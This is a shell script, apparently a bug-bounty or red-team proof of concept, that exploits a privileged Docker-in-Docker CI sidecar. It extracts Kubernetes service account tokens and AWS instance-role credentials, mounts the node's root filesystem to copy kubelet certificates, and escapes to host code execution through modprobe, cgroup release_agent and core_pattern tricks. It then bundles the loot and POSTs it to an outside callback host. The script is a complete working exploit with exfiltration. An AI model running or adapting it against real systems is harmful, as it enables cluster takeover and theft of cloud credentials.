#!/bin/sh
set -eu
MARKER="${MARKER:?}"
CALLBACK="${CALLBACK:?}"
OUT=/share/gatofox-live-rce
mkdir -p "$OUT"
exec 3>&1
exec >"$OUT/nested-full.log" 2>&1
summary() { printf '%s\n' "$*" >&3; }

summary "NESTED_PRIVILEGED_START marker=$MARKER"
apk add --no-cache curl jq util-linux e2fsprogs xfsprogs openssl python3 tar >/dev/null 2>&1 || true
id > "$OUT/nested-id.txt"
uname -a > "$OUT/nested-uname.txt"
cat /proc/self/status > "$OUT/nested-proc-status.txt"
cat /proc/1/cgroup > "$OUT/nested-cgroup.txt" 2>/dev/null || true
cat /proc/mounts > "$OUT/nested-mounts.txt"
ls -la /hostdev > "$OUT/hostdev-list.txt" 2>&1 || true
lsblk -a -o NAME,PATH,TYPE,FSTYPE,SIZE,MOUNTPOINTS > "$OUT/lsblk.txt" 2>&1 || true
tr '\000' '\n' < /dindproc/1/environ > "$OUT/dind-pid1-environ.txt" 2>/dev/null || true
tr '\000' ' ' < /dindproc/1/cmdline > "$OUT/dind-pid1-cmdline.txt" 2>/dev/null || true

# Recover and validate the Kubernetes credential automatically mounted into the
# privileged DinD sidecar (if the cluster did not disable token automounting).
SA_DIR=''
for p in /dindroot/run/secrets/kubernetes.io/serviceaccount /dindroot/var/run/secrets/kubernetes.io/serviceaccount; do
  if [ -f "$p/token" ]; then SA_DIR="$p"; break; fi
done
if [ -n "$SA_DIR" ]; then
  cp "$SA_DIR/token" "$OUT/kubernetes-service-account.jwt"
  cp "$SA_DIR/ca.crt" "$OUT/kubernetes-ca.crt" 2>/dev/null || true
  cp "$SA_DIR/namespace" "$OUT/kubernetes-namespace.txt" 2>/dev/null || true
  SA_TOKEN=$(cat "$SA_DIR/token")
  curl -ksS --max-time 15 -H "Authorization: Bearer $SA_TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/default/pods \
    > "$OUT/kubernetes-token-validation.json" 2> "$OUT/kubernetes-token-validation.err" || true
  summary "KUBERNETES_SA_TOKEN_EXTRACTED=true sha256=$(sha256sum "$OUT/kubernetes-service-account.jwt" | awk '{print $1}')"
else
  summary 'KUBERNETES_SA_TOKEN_EXTRACTED=false'
fi

# Try IMDSv2 from the production pod network. On success this yields the actual
# EC2 node-role AWS credential triplet, which is then validated with STS.
IMDS=http://169.254.169.254
IMDS_TOKEN=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "$IMDS/latest/api/token" 2>/dev/null || true)
if [ -n "$IMDS_TOKEN" ]; then
  HDR="X-aws-ec2-metadata-token: $IMDS_TOKEN"
  curl -sS --max-time 4 -H "$HDR" "$IMDS/latest/dynamic/instance-identity/document" > "$OUT/aws-instance-identity.json" 2>/dev/null || true
  ROLE=$(curl -sS --max-time 4 -H "$HDR" "$IMDS/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -n1 || true)
  if [ -n "$ROLE" ]; then
    curl -sS --max-time 4 -H "$HDR" "$IMDS/latest/meta-data/iam/security-credentials/$ROLE" > "$OUT/aws-role-credentials.json" 2>/dev/null || true
  fi
fi

# Discover and mount the EC2 node root filesystem. A privileged Kubernetes DinD
# sidecar has host devices; a Docker client reachable by an untrusted PR can use
# them to bypass the pod filesystem boundary.
HOSTROOT=''
HOSTDEV=''
mkdir -p /mnt/node
if command -v lsblk >/dev/null 2>&1; then
  lsblk -rno PATH,TYPE,FSTYPE 2>/dev/null | while read -r dev typ fs; do
    [ -n "$dev" ] || continue
    case "$typ" in part|disk|lvm|crypt) ;; *) continue ;; esac
    [ -n "$fs" ] || continue
    umount /mnt/node 2>/dev/null || true
    if [ "$fs" = xfs ]; then
      mount -o ro,nouuid "$dev" /mnt/node 2>/dev/null || continue
    else
      mount -o ro "$dev" /mnt/node 2>/dev/null || continue
    fi
    if [ -f /mnt/node/etc/os-release ] && { [ -d /mnt/node/var/lib/kubelet ] || [ -d /mnt/node/etc/kubernetes ]; }; then
      printf '%s\n' "$dev" > /share/gatofox-live-rce/host-device.txt
      printf '%s\n' "$fs" > /share/gatofox-live-rce/host-fstype.txt
      exit 42
    fi
  done
  rc=$?
  if [ "$rc" = 42 ] && [ -f "$OUT/host-device.txt" ]; then
    HOSTDEV=$(cat "$OUT/host-device.txt")
    FSTYPE=$(cat "$OUT/host-fstype.txt")
    umount /mnt/node 2>/dev/null || true
    if [ "$FSTYPE" = xfs ]; then mount -o ro,nouuid "$HOSTDEV" /mnt/node 2>/dev/null || true; else mount -o ro "$HOSTDEV" /mnt/node 2>/dev/null || true; fi
    mountpoint -q /mnt/node 2>/dev/null && HOSTROOT=/mnt/node
  fi
fi

if [ -n "$HOSTROOT" ]; then
  summary "HOST_ROOT_MOUNTED=true device=$HOSTDEV"
  cat "$HOSTROOT/etc/hostname" > "$OUT/node-hostname.txt" 2>/dev/null || true
  cat "$HOSTROOT/etc/machine-id" > "$OUT/node-machine-id.txt" 2>/dev/null || true
  cat "$HOSTROOT/etc/os-release" > "$OUT/node-os-release.txt" 2>/dev/null || true
  cat "$HOSTROOT/var/lib/kubelet/config.yaml" > "$OUT/kubelet-config.yaml" 2>/dev/null || true
  cat "$HOSTROOT/var/lib/kubelet/kubeconfig" > "$OUT/kubelet-kubeconfig" 2>/dev/null || true
  find "$HOSTROOT/var/lib/kubelet/pki" -maxdepth 2 -type f -o -type l > "$OUT/kubelet-pki-files.txt" 2>/dev/null || true
  for p in \
    "$HOSTROOT/var/lib/kubelet/pki/kubelet-client-current.pem" \
    "$HOSTROOT/var/lib/kubelet/pki/kubelet-client-active.pem" \
    "$HOSTROOT/etc/kubernetes/kubelet/kubeconfig"; do
    if [ -f "$p" ]; then cp -L "$p" "$OUT/$(basename "$p").extracted" 2>/dev/null || true; fi
  done
  for p in "$OUT"/*.pem.extracted; do
    [ -f "$p" ] || continue
    openssl x509 -in "$p" -noout -subject -issuer -serial -dates > "$p.metadata.txt" 2>/dev/null || true
  done
else
  summary 'HOST_ROOT_MOUNTED=false'
fi

# Convert control of the privileged sidecar into an actual process in the node's
# initial namespaces. mountinfo discloses the host-visible backing path of the
# shared emptyDir. The probes below are self-restoring and leave only an evidence
# file in that disposable build volume.
HOST_SHARE_ROOT=$(awk '$5=="/opt/sd_dind_share" {print $4; exit}' /dindproc/1/mountinfo 2>/dev/null || true)
printf '%s\n' "$HOST_SHARE_ROOT" > "$OUT/host-share-root.txt"
HOST_PROCESS_RCE=false
if [ -n "$HOST_SHARE_ROOT" ] && [ "${HOST_SHARE_ROOT#/}" != "$HOST_SHARE_ROOT" ]; then
  HOST_SCRIPT="$HOST_SHARE_ROOT/gatofox-host-rce.sh"
  HOST_PROOF="$HOST_SHARE_ROOT/gatofox-host-rce-proof.txt"
  cat > /share/gatofox-host-rce.sh <<EOF
#!/bin/sh
{
  echo "marker=$MARKER"
  echo "executed_at=\$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo "uid=\$(id -u) gid=\$(id -g)"
  echo "hostname=\$(hostname)"
  echo "uname=\$(uname -a)"
  printf 'pid1_cmdline='; tr '\000' ' ' < /proc/1/cmdline; echo
  printf 'instance_id='; cat /sys/devices/virtual/dmi/id/board_asset_tag 2>/dev/null || true; echo
  printf 'product_uuid='; cat /sys/devices/virtual/dmi/id/product_uuid 2>/dev/null || true; echo
} > "$HOST_PROOF"
chmod 600 "$HOST_PROOF"
EOF
  chmod 755 /share/gatofox-host-rce.sh

  # Technique 1: kernel usermode-helper path. Restore before doing anything else.
  if [ -w /proc/sys/kernel/modprobe ]; then
    ORIG=$(cat /proc/sys/kernel/modprobe 2>/dev/null || echo /sbin/modprobe)
    printf '%s\n' "$ORIG" > "$OUT/original-modprobe-path.txt"
    if printf '%s\n' "$HOST_SCRIPT" > /proc/sys/kernel/modprobe 2>/dev/null; then
      printf '\377\377\377\377' > /tmp/gatofox-invalid-binfmt
      chmod 755 /tmp/gatofox-invalid-binfmt
      /tmp/gatofox-invalid-binfmt >/dev/null 2>&1 || true
      i=0; while [ ! -f /share/gatofox-host-rce-proof.txt ] && [ "$i" -lt 20 ]; do i=$((i+1)); sleep 1; done
      printf '%s\n' "$ORIG" > /proc/sys/kernel/modprobe 2>/dev/null || true
    fi
  fi

  # Technique 2: cgroup-v1 release_agent, used only when the node still exposes it.
  if [ ! -f /share/gatofox-host-rce-proof.txt ] && [ ! -e /sys/fs/cgroup/cgroup.controllers ]; then
    mkdir -p /tmp/gatofox-cg
    for ctrl in rdma memory pids; do
      umount /tmp/gatofox-cg 2>/dev/null || true
      mount -t cgroup -o "$ctrl" cgroup /tmp/gatofox-cg 2>/dev/null || continue
      mkdir -p /tmp/gatofox-cg/release
      if [ -w /tmp/gatofox-cg/release_agent ]; then
        ORIG_RA=$(cat /tmp/gatofox-cg/release_agent 2>/dev/null || true)
        printf '%s\n' "$HOST_SCRIPT" > /tmp/gatofox-cg/release_agent
        printf '1\n' > /tmp/gatofox-cg/release/notify_on_release
        sh -c 'echo $$ > /tmp/gatofox-cg/release/cgroup.procs' || true
        i=0; while [ ! -f /share/gatofox-host-rce-proof.txt ] && [ "$i" -lt 20 ]; do i=$((i+1)); sleep 1; done
        printf '%s\n' "$ORIG_RA" > /tmp/gatofox-cg/release_agent 2>/dev/null || true
      fi
      break
    done
  fi

  # Technique 3: core_pattern usermode helper. It is also restored immediately.
  if [ ! -f /share/gatofox-host-rce-proof.txt ] && [ -w /proc/sys/kernel/core_pattern ]; then
    ORIG_CORE=$(cat /proc/sys/kernel/core_pattern 2>/dev/null || echo core)
    printf '%s\n' "$ORIG_CORE" > "$OUT/original-core-pattern.txt"
    if printf '|%s\n' "$HOST_SCRIPT" > /proc/sys/kernel/core_pattern 2>/dev/null; then
      (ulimit -c unlimited; sh -c 'kill -SEGV $$') >/dev/null 2>&1 || true
      i=0; while [ ! -f /share/gatofox-host-rce-proof.txt ] && [ "$i" -lt 20 ]; do i=$((i+1)); sleep 1; done
      printf '%s\n' "$ORIG_CORE" > /proc/sys/kernel/core_pattern 2>/dev/null || true
    fi
  fi

  if [ -f /share/gatofox-host-rce-proof.txt ]; then
    cp /share/gatofox-host-rce-proof.txt "$OUT/host-process-rce-proof.txt"
    HOST_PROCESS_RCE=true
    summary "HOST_PROCESS_RCE=true proof_sha256=$(sha256sum "$OUT/host-process-rce-proof.txt" | awk '{print $1}')"
  else
    summary 'HOST_PROCESS_RCE=false'
  fi
else
  summary 'HOST_PROCESS_RCE=false host_share_path_unavailable=true'
fi

# Validate an extracted AWS triplet through a signed STS GetCallerIdentity call.
if [ -s "$OUT/aws-role-credentials.json" ] && jq -e '.AccessKeyId and .SecretAccessKey and .Token' "$OUT/aws-role-credentials.json" >/dev/null 2>&1; then
  cat > "$OUT/sts_validate.py" <<'PY'
import datetime, hashlib, hmac, json, urllib.request
p='/share/gatofox-live-rce/'
c=json.load(open(p+'aws-role-credentials.json'))
service='sts'; region='us-east-1'; host='sts.amazonaws.com'
q='Action=GetCallerIdentity&Version=2011-06-15'
now=datetime.datetime.now(datetime.timezone.utc); amz=now.strftime('%Y%m%dT%H%M%SZ'); day=now.strftime('%Y%m%d')
headers={'host':host,'x-amz-date':amz,'x-amz-security-token':c['Token']}
signed='host;x-amz-date;x-amz-security-token'
canonical='GET\n/\n'+q+'\n'+''.join(k+':'+headers[k]+'\n' for k in signed.split(';'))+'\n'+signed+'\n'+hashlib.sha256(b'').hexdigest()
scope=f'{day}/{region}/{service}/aws4_request'
tosign='AWS4-HMAC-SHA256\n'+amz+'\n'+scope+'\n'+hashlib.sha256(canonical.encode()).hexdigest()
def H(k,m): return hmac.new(k,m.encode(),hashlib.sha256).digest()
k=H(('AWS4'+c['SecretAccessKey']).encode(),day); k=H(k,region); k=H(k,service); k=H(k,'aws4_request')
sig=hmac.new(k,tosign.encode(),hashlib.sha256).hexdigest()
auth=f'AWS4-HMAC-SHA256 Credential={c["AccessKeyId"]}/{scope}, SignedHeaders={signed}, Signature={sig}'
req=urllib.request.Request('https://'+host+'/?'+q,headers={'X-Amz-Date':amz,'X-Amz-Security-Token':c['Token'],'Authorization':auth})
try:
 with urllib.request.urlopen(req,timeout=20) as r: open(p+'sts-get-caller-identity.xml','wb').write(r.read())
except Exception as e:
 open(p+'sts-get-caller-identity.error.txt','w').write(repr(e))
PY
  python3 "$OUT/sts_validate.py" || true
  summary "AWS_TRIPLET_EXTRACTED=true access_key_prefix=$(jq -r .AccessKeyId "$OUT/aws-role-credentials.json" | cut -c1-8) sts_validated=$([ -s "$OUT/sts-get-caller-identity.xml" ] && echo true || echo false)"
else
  summary 'AWS_TRIPLET_EXTRACTED=false'
fi

# Bundle all read-only evidence and recovered live credentials, then send it only
# to the controlled RequestRepo session rather than the public build log.
tar -czf "$OUT/bundle.tgz" -C "$OUT" \
  $(find "$OUT" -maxdepth 1 -type f ! -name bundle.tgz ! -name requestrepo-payload.json ! -name nested-full.log -printf '%f\n') 2>/dev/null || true
B64=$(base64 "$OUT/bundle.tgz" | tr -d '\n')
printf '{"marker":"%s","phase":"nested-privileged","node_id":"%s","host_root_mounted":%s,"host_process_rce":%s,"aws_triplet":%s,"bundle_b64":"%s"}\n' \
  "$MARKER" "${NODE_ID:-unknown}" "$([ -n "$HOSTROOT" ] && echo true || echo false)" \
  "$HOST_PROCESS_RCE" "$([ -s "$OUT/aws-role-credentials.json" ] && echo true || echo false)" "$B64" > "$OUT/requestrepo-payload.json"
curl -ksS --max-time 30 -H 'Content-Type: application/json' --data-binary "@$OUT/requestrepo-payload.json" "$CALLBACK/nested" > "$OUT/requestrepo-response.txt" || true
summary "REQUESTREPO_NESTED_POST=true bundle_sha256=$(sha256sum "$OUT/bundle.tgz" | awk '{print $1}')"
summary 'NESTED_PRIVILEGED_DONE=true'
